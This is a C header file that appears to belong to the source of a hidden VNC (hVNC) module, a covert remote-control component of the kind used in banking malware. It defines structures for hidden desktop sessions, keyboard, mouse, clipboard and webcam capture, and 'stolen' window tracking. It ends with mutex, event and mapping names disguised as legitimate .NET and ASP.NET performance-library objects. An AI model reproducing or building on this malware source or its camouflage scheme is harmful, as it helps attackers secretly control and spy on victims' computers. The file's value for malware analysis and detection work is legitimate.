#ifndef HVNC_H_INCLUDED
#define HVNC_H_INCLUDED

#include "rfb\rfb.h"
#include "hvnc.h"

struct HVNC_SHORT_CLIENT_INFO
{
    PASSWORD_ITEM piPassword;
    sockaddr_in saClient;
    DWORD dwLastKbdInputTime;
    DWORD dwLastMouInputTime;
    DWORD dwLastShiftInputTime;
};

struct Z_ORDER_LIST_ITEM
{
    HWND hWnd;
    Z_ORDER_LIST_ITEM *lpOwner;

    bool bAltTabItem;
    bool bHidden;
    RECT rect;
    bool bTopMost;
    bool bOverlapped;
    bool bStolen;

    Z_ORDER_LIST_ITEM *lpNext;
    Z_ORDER_LIST_ITEM *lpPrev;
};

struct DESKTOP_INFO
{
    DWORD dwFlags;
    char szDeskName[100];
    int dwWidth;
    int dwHeight;
    int dwWidthInBytes;
    byte bBitsPerPixel;
    byte bBytesPerPixel;

    bool bWebCam;
    bool bInputDesktop;
};

struct WEBCAM_INFO
{
    DWORD dwThreadId;
    HANDLE hThread;
    DWORD dwDeviceIndex;
    HANDLE hEvent;
};

struct LAYOUTS_INFO
{
    TCHAR szLoc[3];
    UINT dwLayout;
    HICON hIcon;
};

struct LAYOUT_SWITCHER_INFO
{
    UINT dwLayout;
    LAYOUTS_INFO liInfo[40];
    HMENU hMenu;
    NOTIFYICONDATA nid;
    bool bSwitcherStarted;
};

struct TASK_SWITCHER_INFO
{
    bool bTaskSwitcherIsShown;
    HWND hTaskSwitcherWnd;
    HWND hTitle;
    int dwWindowsCount;
    int dwCurWnd;
    bool bNewCountDown;
    HWND hLastWnd;
    HWND hFrgWnd;
    HFONT hFont;
};

struct DIB_INFO
{
    byte *lpBkgBits;
    byte *lpOldBkgBits;
    HBITMAP hBitmap;
    HBITMAP hOldBitmap;
    HBITMAP hTmpBitmap;
    HBITMAP hTmpOldBitmap;
    DWORD *lpChecksums;
    DWORD dwScreenBufferSize;

    HBITMAP hIntermedOldBitmap;
    HDC hIntermedMemDC;
    HDC hDC;
    HDC hCompDC;
    HDC hTmpCompDC;
    HBITMAP hIntermedMemBitmap;
    LPVOID lpIntermedDIB;

    HDC hTmpIntermedMemDC;
    HBITMAP hTmpIntermedMemBitmap;
    HBITMAP hTmpIntermedOldBitmap;
};

typedef struct
{
    BYTE bButtonMask;
    WORD wXPos;
    WORD wYPos;
} EVENT_POINTER;

struct EVENTS_INFO
{
    HANDLE hScreenUpdateThread;

    HANDLE hInputMutex;
    HANDLE hSharedMemMutex;
    HANDLE hVNCKillEvent;
    HANDLE hPaintMutex;
    HANDLE hSendThreadMessageMutex;
    HANDLE hSendThreadMessageEvent;

    HANDLE hClipboardUpdatedEvent;
    EVENT_POINTER epLast;
    int dwClients;
    DWORD dwSleep;
};

struct KBD_STATE_INFO
{
    bool bTabPressed;
    bool bSkipEvent;
    bool bShiftPressed;
    bool bVKDown;
    bool bKeyDown;
};

struct MOU_STATE_INFO
{
    HWND hLastDownWindow;
    HWND hLastTopLevelWindow;
    DWORD dwLastDownMessage;
    DWORD dwLastDownTime;
    POINT ptLastDownPoints;
    bool bMoving;
    RECT rcMovingWnd;
};

struct WNDS_INFO
{
    HWND hProgmanWnd;
    HWND hStartBtnWnd;
    HWND hDeskWnd;
    HWND hShellWnd;
    HWND hTrayWnd;
    HWND hTakSwWnd;
    HWND hTakSwRebarWnd;
    HWND hToolBarWnd;
    HWND hMSTaskListWnd;
    HWND hDeskListView;
    HWND hDefView;
    HWND hTrayNotifyWnd;
    HWND hSysPagerWnd;
    HWND hOverflowIconWindow;
    HWND hTrayUserNotifyToolbarWnd;
    HWND hTrayUserNotifyOverflowToolbarWnd;
    HWND hTraySystemNotifyToolbarWnd;
    HWND hStartMenuWnd;
};

struct OBJECTS_NAMES
{
    DWORD dwHash;
    TCHAR szGlobalMappingName[60];
    TCHAR szSharedMemMappingName[60];
    TCHAR szVNCKillEventName[60];
    TCHAR szInputMutex[60];
    TCHAR szSharedMemMutex[60];
    TCHAR szClipboardUpdatedEvent[60];
    TCHAR szSendThreadMessageEvent[60];
    TCHAR szSendThreadMessageMutex[60];
    char szShell[300];
};

struct WND_WATCHER_INFO
{
    CRITICAL_SECTION csWndsList;
    Z_ORDER_LIST_ITEM *lpZOrderList;
    bool bMessageBoxIsShown;

    bool bWatcherStarted;
    HWINEVENTHOOK hHook1;
    HWINEVENTHOOK hHook2;
    HWINEVENTHOOK hHook3;
};

struct THREADS_INFO
{
    HANDLE hThreads[400];
    int dwThreadsCount;
    CRITICAL_SECTION csThreads;
};

extern HKL hklLocales[40];
extern int dwLocalesNum;

struct THREADITEM
{
    union
    {
        DWORD_PTR dwId;
        DWORD64 dwIdTmp;
    };
    union
    {
        HANDLE hThread;
        DWORD64 hThreadTmp;
    };
};

#pragma pack(push,1)
struct GLOBAL_VNC_DATA
{
    POINT ptCursor;
    byte KbdState[256];

union
{
    HWND hForegroundWnd;
    DWORD64 tmp;
};

union
{
    HWND hCapturedWnd;
    DWORD64 tmp;
};

    DWORD dwExplorersPID;
    DWORD dwCapturedThreadID;
    WORD wCapturedArea;

    char szDeskName[100];
    DWORD dwDeskFlags;
    int dwWidth;
    int dwHeight;
    byte bBitsPerPixel;
    DWORD dwVNCMessage;
    bool bAutodectLayout;
    bool bTrayIconUnderCursor;

    THREADITEM dwIDs[400];

    WCHAR ClipboardData[1024*10];
    DWORD dwClipboardDataSize;
};

struct SHARED_VNC_DATA
{
    int dwNewWidth;
    int dwNewHeight;
    byte bNewBitsPerPixel;
    DWORD dwNewDeskHash;
};
#pragma pack(pop)

typedef struct
{
    rfbScreenInfoPtr rfbScreen;

    ClientGoneHook *lpClientGoneHook;
    NewClientHook *lpNewClientHook;

    bool bActive;
    bool bStopped;
    bool bCpuSleep;
    bool bIsVNC;
    bool bUpdateThreadStarted;

    int dwExplorersPID;
    HDESK hDesktop;

    HANDLE hGlobalVNCMapping;
    GLOBAL_VNC_DATA *lpGlobalVNCData;

    HANDLE hSharedMemMapping;
    byte *lpSharedMemMapping;

    DESKTOP_INFO DeskInfo;
    WEBCAM_INFO WebCamInfo;

    LAYOUT_SWITCHER_INFO LayoutSwitcherInfo;
    TASK_SWITCHER_INFO TaskSwitcherInfo;
    DIB_INFO DIBInfo;
    EVENTS_INFO EventsInfo;
    KBD_STATE_INFO KbdStateInfo;
    MOU_STATE_INFO MouStateInfo;
    WNDS_INFO WndsInfo;
    OBJECTS_NAMES Names;
    WND_WATCHER_INFO WndWatcherInfo;
    THREADS_INFO ThreadsInfo;

    DWORD dwLastReconnectionTime;
    DWORD dwReconnectionsCount;
} HVNCS, *PHVNC;

struct HVNC_HANDLE
{
    DWORD hHandle;
    PHVNC lpServer;
    HANDLE hEvent;
    HVNC_CONNECTION_INFO ConnInfo;
    HVNC_HANDLE *lpPrev;
    HVNC_HANDLE *lpNext;
};

extern HVNC_HANDLE *lpHandles;
extern CRITICAL_SECTION csHVNC;

HVNC GetHVNC(PHVNC lpServer);

#define HVNC_KILL_EVENT_NAME _T(".NET CLR Networking_Perf_Library_Lock_PID_0")
#define HVNC_HANDLES_MUTEX_NAME _T("RemoteAccess_Perf_Library_Lock_PID_0")
#define HVNC_HANDLES_MAPPING_NAME _T("AtlDebugAllocator_FileMappingNameStatic3_0")
#define HVNC_SHARED_VNC_MAPPING_NAME _T(".NET Data Provider for SqlServer_Perf_Library_Lock_PID_0")
#define HVNC_DISP_CHANGE_EVENT_NAME _T("ASP.NET_2.0.50727_Perf_Library_Lock_PID_0")
#define HVNC_MAX_HANDLES 900

#endif // HVNC_H_INCLUDED
